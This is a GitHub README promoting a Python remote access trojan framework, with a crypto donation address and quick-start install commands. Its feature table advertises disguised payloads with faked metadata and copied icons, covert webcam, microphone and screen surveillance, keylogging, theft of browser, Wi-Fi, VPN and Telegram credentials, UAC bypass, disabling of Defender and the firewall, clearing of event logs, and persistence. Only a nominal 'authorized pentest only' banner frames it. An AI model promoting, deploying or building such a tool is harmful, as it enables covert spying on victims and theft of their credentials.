<p align="center">
  <img src="icons/rat_ico.png" width="170">
</p>

<p align="center">
  <img src="icons/word.png" width="650">
</p>

<p align="center">
  <b>THE BEST PYTHON RAT FRAMEWORK</b>
</p>
<p align="center">
  <b>⚠️For authorized pentest only⚠️</b>
</p>
<p align="center">
  <a href="https://god-of-rat.gitbook.io/god-of-rat">
    <img src="https://img.shields.io/badge/FULL_DOCUMENTATION-8B0000?style=for-the-badge&logo=gitbook&logoColor=white">
  </a>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Python-3.10%2B-1a1a1a?logo=python&logoColor=white&color=5a1a1a">
  <img src="https://img.shields.io/badge/License-MIT-5a1a1a">
  <img src="https://img.shields.io/github/stars/Katastrofa0/GOD-OF-RAT?style=flat&color=9c2e2e">
</p>

<p align="center">
  <sub><i>I made it totally free for you guys, and would appreciate any help (not for coffee, but first car)</i></sub>
</p>

<p align="center">
  <img src="icons/support.png" width="60"><br>
  <sub><sup><small><b>XMR</b></small></sup></sub>
</p>

<p align="center">
  <sub><sup><i>44mVG1Uy1dsDSdnjTtbQ5CAVKRT1wqQsF1LgRPkK7ED6gHWMU4za3GrQo82NvnpbfkBZFnKQm3ybPemj1ZAaNAsyL2DfVhq</i></sup></sub><br>
</p>

---

<p align="center">
  <b>This is the most convenient and user-friendly Python RAT framework, async-powered and a pure joy to use.</b>
</p>

<p align="center">
  <img src="icons/preview.png" width="999">
</p>


### ◈ WHAT YOU GET

| Category | Capabilities |
| :--- | :--- |
| **Async C2 Core** | A Python asyncio server that handles hundreds of agents at once. It's fast, stable, and won't choke under load. |
| **Agent Builder** | A simple GUI to build your payload. Pick which modules you want, add an AES key, change the icon or COPY icon from other's EXE, fake the file metadata, turn on Anti‑VM protection, pad the file size, or set up automatic persistence. Everything happens before you click compile. |
| **Telegram Bot Multiplexer** | You can run several Telegram bots at the same time. Each user gets their own isolated session, which makes team work clean and organized. |
| **AES‑256 Encryption** | All traffic between the server, controller, and agents is encrypted. If you just want to test things, you can switch to plain text mode. |
| **Remote Shell** | An interactive command line that works exactly like your local terminal. Execute any system command and see the output in real time. |
| **File Manager** | Browse remote files, upload by dragging and dropping, download anything, delete files, or run executables. Folders are automatically zipped before upload. So satisfying to use. |
| **Live Surveillance** | Stream the target's screen live, watch through their webcam, listen to their microphone, take screenshots, or log every keystroke either continuously or for a set amount of time. |
| **Best Keylogger** | The keylogger is one of the best parts of this framework. Supports absolutely any keyboard layout. Clean, readable output without garbage or extra symbols.  |
| **Credentials Harvesting** | Extract saved Wi‑Fi passwords, browser logins from Chrome, Edge, Firefox, and Brave, OpenVPN credentials, and whole Telegram session folders. |
| **Evasion and Persistence** | Bypass UAC using the Fodhelper trick. Disable Windows Defender, turn off the firewall, avoid virtual machine detection, and clear event logs. To maintain access, you can use Registry autorun, Startup folder shortcuts, Scheduled Tasks, WMI event subscriptions, or install as a Windows service. |
| **Windows Management** | Edit the registry remotely, manage services, view scheduled tasks, control WMI subscriptions, and kill or monitor processes. |
| **Fun Modules** | Zoom the screen, invert mouse movement, make the mouse act drunk, shake windows, leave ghost trails behind the cursor, show endless alert popups, or disable the Task Manager. There's more where that came from. |
<p align="center">
<sub>Feel free to submit PRs, suggest new modules, or improve existing ones.</sub>
</p>
<p align="center">
<sub>Let's make this framework a community effort.</sub>
</p>

---

### ◈ QUICK START

```bash
git clone https://github.com/Katastrofa0/GOD-OF-RAT.git
cd GOD-OF-RAT
pip install -r requirements.txt
```
```bash
python server.py [--aes-key '$aeskey']  # Start server
python controller.py  # Launch GUI (another terminal)

# Make sure encryption.py is in the same directory as server.py
```
If you encountered some PyAudio & Crypto trouble, install it like this:
```bash
pip install pipwin
pipwin install pyaudio

pip uninstall crypto pycrypto
pip install pycryptodome
```
<p align="center">
  <b>Comprehensive documentation with setup instructions and detailed module descriptions is available here:</b>
</p>
<p align="center">
  <b>https://god-of-rat.gitbook.io/god-of-rat</b>
</p>

---

<p align="center">
  <a href="https://star-history.com/#Katastrofa0/GOD-OF-RAT&Date">
    <img src="https://api.star-history.com/svg?repos=Katastrofa0/GOD-OF-RAT&type=Date&theme=dark" width="780">
  </a>
</p>
